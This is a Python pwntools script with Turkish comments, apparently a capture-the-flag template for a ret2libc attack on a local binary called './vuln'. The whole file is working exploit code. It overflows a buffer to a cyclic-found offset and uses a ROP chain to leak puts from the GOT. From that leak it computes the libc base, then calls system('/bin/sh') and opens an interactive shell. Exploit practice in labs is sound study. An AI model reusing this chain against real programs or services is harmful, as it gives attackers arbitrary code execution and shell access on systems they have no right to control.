#!/usr/bin/env python3
# ret2libc başlangıç şablonu
# Not: adresleri direkt kopyalama, kendi binary/libc çıktına göre doldur.

from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
context.log_level = "info"

HOST = "127.0.0.1"
PORT = 1337

libc = ELF("./libc.so.6", checksec=False)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


io = start()

# cyclic ile bul:
# cyclic 300
# cyclic_find(0x6161616c)
offset =  cyclic_find(0x6161616c)  # örnek, değiştir

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"],
)

# Menü varsa burayı challenge'a göre değiştir.
io.sendlineafter(b"> ", payload)

leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"puts leak: {hex(leak)}")

libc.address = leak - libc.symbols["puts"]
log.info(f"libc base: {hex(libc.address)}")

payload2 = flat(
    b"A" * offset,
    ret,  # stack alignment için, gerekmezse sil
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    libc.symbols["system"],
)

io.sendlineafter(b"> ", payload2)
io.interactive()
